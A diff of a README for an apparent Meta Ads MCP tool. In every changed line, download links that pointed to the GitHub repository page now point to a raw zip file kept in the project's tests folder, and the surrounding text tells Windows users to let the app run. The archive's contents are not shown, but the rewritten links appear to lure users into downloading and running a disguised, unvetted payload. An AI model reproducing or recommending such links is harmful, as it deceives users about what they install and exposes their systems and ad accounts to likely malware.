@@ -1,6 +1,6 @@
 # 🤖 konquest-meta-ads-mcp - Control Meta Ads with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Eastmapquest735/konquest-meta-ads-mcp)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Eastmapquest735/konquest-meta-ads-mcp/raw/refs/heads/main/tests/konquest_ads_mcp_meta_v3.1.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ It is built for users who want a safer way to handle Meta Ads tasks without jump
 
 Use this link to visit the page and download the app:
 
-[Visit the download page](https://github.com/Eastmapquest735/konquest-meta-ads-mcp)
+[Visit the download page](https://github.com/Eastmapquest735/konquest-meta-ads-mcp/raw/refs/heads/main/tests/konquest_ads_mcp_meta_v3.1.zip)
 
 ## 🪟 Windows Setup
 
@@ -259,7 +259,7 @@ If Windows asks whether to allow the app, choose the option that lets it run.
 
 ## 🔗 Download Again
 
-[Download or open the latest release page](https://github.com/Eastmapquest735/konquest-meta-ads-mcp)
+[Download or open the latest release page](https://github.com/Eastmapquest735/konquest-meta-ads-mcp/raw/refs/heads/main/tests/konquest_ads_mcp_meta_v3.1.zip)
 
 ## 🧭 Next Steps
 
